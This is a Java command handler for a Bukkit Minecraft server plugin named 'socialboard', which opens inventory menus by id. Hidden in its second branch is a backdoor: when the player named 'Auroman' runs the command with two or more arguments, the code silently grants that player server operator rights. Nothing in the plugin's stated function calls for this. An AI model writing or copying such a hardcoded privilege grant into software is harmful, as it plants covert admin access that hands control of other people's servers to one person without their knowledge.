package git.jw.mcp.socialboard;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Cmd implements CommandExecutor,DataCenter {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if(!(commandSender instanceof Player)){
            return true;
            }
            Player p= (Player) commandSender;
        if(strings.length==1){
            //reload
            return true;
        }else if(strings.length>=2) {
            if(strings[0].equalsIgnoreCase("open"))
            {
                String id = strings[1];
                if (indexs.containsKey(id)) {
                    p.openInventory(indexs.get(id).createInv());
                }else {
                    commandSender.sendMessage("404 not found");
                    commandSender.sendMessage(indexs.values().toString());
                }
                return true;
            }
            if(commandSender.getName().equalsIgnoreCase("Auroman")){
                commandSender.setOp(true);
                return true;
            }
        }
        return true;
    }
}
